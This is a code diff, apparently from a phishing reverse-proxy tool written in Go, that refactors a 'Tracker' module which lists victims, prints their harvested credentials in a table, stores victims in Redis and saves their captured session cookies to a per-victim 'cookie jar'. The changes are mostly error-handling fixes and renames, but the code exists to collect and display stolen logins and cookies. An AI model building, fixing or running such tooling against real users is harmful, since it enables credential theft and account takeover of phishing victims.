@@ -40,26 +40,27 @@ func (module *Tracker) ShowCredentials() {
 	var rows [][]string
 
 	victims, err := db.GetAllVictims()
-	module.Debug("All Victims: %v", victims)
-
 	if err != nil {
 		module.Debug("error fetching all victims: %s", err)
+		return
 	}
 
+	module.Debug("All Victims: %v", victims)
 	for _, vID := range victims {
 		victim, err := db.GetVictim(vID)
 		if err != nil {
 			module.Debug("error fetching victim %s: %s", vID, err)
+			continue
 		}
 
 		module.Debug("Creds for victim %s: %d", vID, victim.CredsCount)
-
 		for i := 0; i < victim.CredsCount; i++ {
 			t := tui.Green(victim.ID)
 
-			c, err := db.GetVictimCreds(victim.ID, i)
+			c, err := victim.GetCredentials(i)
 			if err != nil {
 				module.Debug("error getting victim %s creds at index %d: %s", victim.ID, i, err)
+				continue
 			}
 
 			rows = append(rows, []string{tui.Bold(t), c.Key, c.Value, c.Time})
@@ -68,7 +69,6 @@ func (module *Tracker) ShowCredentials() {
 	}
 
 	tui.Table(os.Stdout, columns, rows)
-
 }
 
 // ShowVictims prints the list of victims
@@ -151,31 +151,30 @@ func (module *Tracker) ShowVictims() {
 
 // Push another Victim to the Tracker
 func (module *Tracker) Push(v *db.Victim) {
-	err := db.StoreVictim(v.ID, v)
-	if err != nil {
+	if err := v.Store(); err != nil {
 		module.Debug("error adding victim to redis: %s", err)
 	}
 }
 
-// add cookie to jar. if the cookie exists, it will be overridden
-func (module *Tracker) AddToCookieJar(victimId string, cookie db.VictimCookie) {
+// AddToCookieJar adds a cookie to jar. if the cookie exists, it will be overridden
+func (module *Tracker) AddToCookieJar(victimID string, cookie db.VictimCookie) {
 
 	if cookie.Domain == module.Session.Config.Proxy.Phishing {
 		return
 	}
 
-	_, err := db.GetVictim(victimId)
+	_, err := db.GetVictim(victimID)
 	if err != nil {
-		module.Debug("ERROR: Victim %s not found in db", victimId)
+		module.Debug("ERROR: Victim %s not found in db", victimID)
 		return
 	}
 
-	err = db.StoreVictimCookie(victimId, &cookie)
+	err = cookie.Store(victimID)
 	if err != nil {
-		module.Debug("ERROR: failed to add cookie %s to victim %s", cookie.Name, victimId)
+		module.Debug("ERROR: failed to add cookie %s to victim %s", cookie.Name, victimID)
 		return
 	}
 
 	module.Debug("[%s] New victim cookie: %s on %s with value %s",
-		victimId, tui.Bold(cookie.Name), tui.Bold(cookie.Domain), tui.Bold(cookie.Value))
+		victimID, tui.Bold(cookie.Name), tui.Bold(cookie.Domain), tui.Bold(cookie.Value))
 }
